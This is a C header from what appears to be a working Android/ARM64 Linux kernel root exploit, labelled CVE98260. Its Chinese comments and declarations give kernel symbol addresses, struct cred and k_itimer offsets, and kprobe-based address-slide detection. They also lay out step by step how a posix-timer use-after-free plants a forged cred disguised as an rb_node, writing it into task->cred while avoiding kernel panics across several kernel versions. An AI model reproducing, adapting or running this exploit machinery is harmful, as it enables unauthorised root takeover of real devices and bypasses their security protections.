#ifndef KERNEL_OFFSETS_H
#define KERNEL_OFFSETS_H

#include <stdbool.h>
#include <stdint.h>

/*
 * ---- 方法开关：KO_TIMER_ALLOC_PROBE_OFF ----
 *
 * 该变量语义：
 *
 * == 0 ：不启用 kprobe 法，slide 走 kmem_cache_alloc tracepoint 的 call_site
 *        （calibrate-a 的 timer_link = do_timer_create+0xa8 法）。
 *
 * != 0 ：启用 kprobe 法，该值同时作为 do_timer_create 里的插桩指令偏移——
 *        slide     ：kprobe __arm64_sys_getpid 读 %pc，slide = ip - KO_LINK_GETPID
 *        timer 指针：kprobe do_timer_create+<该值> 读 %x19（alloc_posix_timer 被内联）
 *
 * 两条路径的代码都编译进二进制（源码里不用 #ifdef 裁剪），只由该值决定走哪条。
 * 默认 0 沿用 tracepoint 法；要 kprobe 法就填对应内核的偏移，nezha 6.12 为 0xb0
 * （默认值改 kernel_offsets.c，或直接用 --config 的 JSON 覆盖）。
 */

/*
 * ---- 伪造 cred 的摆放方式：uaf_plant.c 的全局变量 g_cred_split_node ----
 *
 * 1 = 分开摆：cred 放在 node 之后 CVE98260_CRED_NODE_DELTA 处，两者不重叠。
 * 0 = 叠着摆：cred 直接覆盖 node（旧布局）。
 *
 * init_offsets() 按 profile 的 cred_uid 自动填：cred_uid 是
 * offsetof(struct cred, uid)，因 uid 紧跟 usage，它也等于 usage 的宽度：
 *   cred_uid == 4 -> 1（5.15 / 6.1：usage 是 4 字节的 atomic_t）
 *   cred_uid == 8 -> 0（6.6 / 6.12 / 6.18：usage 是 8 字节的 atomic_long_t）
 *   其它值        -> 0（历史验证过的行为），并打一行告警。
 *
 * 分开摆（1）：5.15 / 6.1 必须这样 —— 这些内核 struct cred 的 usage 只有 4 字节（uid@4），
 *     cred 压在 node 上时 node->__rb_parent_color 的高 32 位会被 memset 成 0，
 *     得到 0x00000000<low32(node_kva)>（未映射的用户地址）；rb_erase() 取 parent
 *     时解这个地址 -> Oops -> panic_on_oops，表现为页回收完成后立刻死机。
 *     本模式下 node 被写成自洽的 rb_node：
 *       node[0x00] = cred 地址（可解，且 != node，能过 RB_EMPTY_NODE 检查）
 *       node[0x08] = NULL
 *       node[0x10] = &task->cred（rb_erase 的 tmp->__rb_parent_color = pc 把 cred
 *                    地址写进 task->cred，随后 __rb_change_child 踩掉 cred+8 的
 *                    gid/suid，由 one_uaf(g_cred_kva + 8) 零写修回）
 *     并且 cred 自己也要能当 rb_node 收尾（waitpid 回收最后一个线程时
 *     __exit_signal -> posix_cpu_timers_exit_group 的 while(rb_leftmost) 循环
 *     只有 rb_next() 返回 NULL 才会停）：
 *       cred[0x00] = usage <= 3   -> rb_parent(cred) == NULL
 *       cred[0x08] = node 地址    -> rb_next(node) 能沿 parent 爬到 cred 再返回 NULL
 *     缺任何一条，rb_leftmost 都会变成野指针，下一轮把 cred 当 rb_node 用并
 *     把 pc 写进 &task->cred（= 2），当场 panic。
 *
 * 叠着摆（0，旧行为）：cred 直接覆盖 node（cred[0]=usage、cred[1]=uid/gid、cred[2]=
 *     &task->cred），只在 usage 为 8 字节（cred_uid >= 8）的内核上验证过。
 *     这类内核走这条可得到与旧版完全一致的二进制。
 *
 * profile 缺 v4 字段（v2/v3 blob）时 kernel_table.c 会补 6.6 默认值（cred_uid=8），
 * 即自动回落到叠着摆。
 */
/* cred 相对 node 的偏移（字节，仅"分开摆"使用）。必须 8 字节对齐；下限不许压到
 * k_itimer 本体上（运行期校验 KITIMER_NODE + DELTA >= KITIMER_SIZE，6.6 为
 * 0x108-0x78=0x90，5.15 更宽），同时留出内核写 node+0x48（it.cpu.firing /
 * firing_list / 时间戳）的空间。 */
#define CVE98260_CRED_NODE_DELTA   0x100

#if (CVE98260_CRED_NODE_DELTA > 0x1000) || (CVE98260_CRED_NODE_DELTA & 7)
#error "CVE98260_CRED_NODE_DELTA must be 8-byte aligned and <= 0x1000"
#endif

/*
 * ---- 编译开关：CRASH_DEBUG_LOG ----
 *
 * = 1（默认）：打开“落盘检查点”。uaf_plant.c 在关键阶段把一行
 *     [crash] <阶段>
 * 写进 /data/local/tmp/skroot_cve98260.log 并 fdatasync。
 *
 * 为什么需要它：内核 panic 不回写页缓存，stdout 的尾巴经常整段丢失（pstore 在
 * 很多机器上也是空的），于是“最后一行日志”往往离真实死点差好几个阶段。这个
 * 文件每次 write 返回时内容已经在块设备上，重启后 `cat` 出来的最后一行就是
 * 死机点。典型对照：
 *     page_freed=1      第一次 socket write 前后（页刚回收/正在灌 pattern）
 *     first write n=..  同一轮后续 write
 *     round=N writes=.. 死在 trace_seen 或下一轮
 *     backfill end      死在本函数收尾（quiet_reclaim_trace / munmap / close）
 *     reclaim ok        死在 wait_zombie
 *     zombie ..         死在 waitpid（__exit_signal ->
 *                       posix_cpu_timers_exit_group 的 while(rb_leftmost)）
 *     reaped ..         死在之后的 destroy_rings / 下一个 one_uaf
 *     installed at ..   死在 fixup 或 cred 子进程真正使用伪造 cred 时
 *
 * = 0：整个实现不编译，所有 crash_log(...) 调用点变成空语句；发布版可以关掉，
 * 省掉每次检查点的 fdatasync（几 ms）。
 *
 * 注意：检查点文件总量限制在一页（<3900B）以内，超出后不再写。
 */
#define CRASH_DEBUG_LOG        0

/* ---- 线性映射基址：只传两个输入量，__va(0) 由运算推导 ---- */
extern uint64_t P0_PAGE_OFFSET;   /* 默认 0xFFFFFF8000000000 = -(1 << 39) */
extern uint64_t P0_PHYS_OFFSET;   /* 默认 0x80000000，DRAM 起始物理地址 */

/* KO_PAGE_OFFSET = __va(0) = PAGE_OFFSET - memstart_addr = 0xFFFFFF7F80000000 */
extern uint64_t KO_PAGE_OFFSET;

/* ---- 链接地址（link-time kernel addresses） ---- */
extern uint64_t KO_TIMER_LINK;
extern uint64_t KO_CRED_LINK;
extern uint64_t KO_SELINUX_LINK;
extern uint64_t KO_USER_NS;
extern uint64_t KO_ROOT_USER;
extern uint64_t KO_GROUPS;
extern uint64_t KO_UCOUNTS;
extern uint64_t KO_TASK_ALLOC_LINK;

/* ---- task_struct / k_itimer 偏移 ---- */
extern uint32_t KO_TASK_CRED;
extern uint32_t KO_TASK_STRUCT_SIZE;
extern uint32_t KO_CRED_UID;
extern uint32_t KO_KITIMER_NODE;
extern uint64_t KO_KITIMER_SIZE;

/* ---- struct cred 布局 ---- */
extern uint32_t KO_CRED_SIZE;
extern uint32_t KO_CRED_CAP_INH;
extern uint32_t KO_CRED_CAP_PERM;
extern uint32_t KO_CRED_CAP_EFF;
extern uint32_t KO_CRED_CAP_BSET;
extern uint32_t KO_CRED_CAP_AMB;
extern uint32_t KO_CRED_OFF_SECURITY;
extern uint32_t KO_CRED_OFF_USER;
extern uint32_t KO_CRED_OFF_USER_NS;
extern uint32_t KO_CRED_OFF_UCOUNTS;
extern uint32_t KO_CRED_OFF_GROUPS;


/* ---- kprobe 插桩目标符号名（文本项，不从 JSON 读） ---- */
#define KO_GETPID_PROBE       "__arm64_sys_getpid"
#define KO_TIMER_ALLOC_PROBE_NAME  "do_timer_create+0x"
/* 0 = 不启用 kprobe 法；非 0 = do_timer_create 的插桩偏移（nezha 6.12 = 0xb0） */
extern uint32_t KO_TIMER_ALLOC_PROBE_OFF;

/* ---- fetch 串（读寄存器） ---- */
#define KO_GETPID_FETCH       "ip=%pc:x64"
#define KO_TIMER_ALLOC_FETCH_PREFIX  "timer=%x"
extern uint64_t KO_TIMER_ALLOC_FETCH_REG;   /* 默认 0，读寄存器 x0 */
#define KO_TIMER_ALLOC_FETCH_SUFFIX  ":x64"

/* ---- 链接地址 ---- */
extern uint64_t KO_LINK_GETPID;  /* 默认 0xffffffc0801022a8 = __arm64_sys_getpid */

/*
 * ---- 运行期加载接口（kernel_offsets.c） ----
 */

/* 按 P0_PAGE_OFFSET - P0_PHYS_OFFSET 重算 KO_PAGE_OFFSET。 */
void kernel_offsets_recompute_page_offset(void);

bool kernel_offsets_load_from_json(const char *json_text);

bool kernel_offsets_load_from_sh(const char *sh_path);

#endif /* KERNEL_OFFSETS_H */
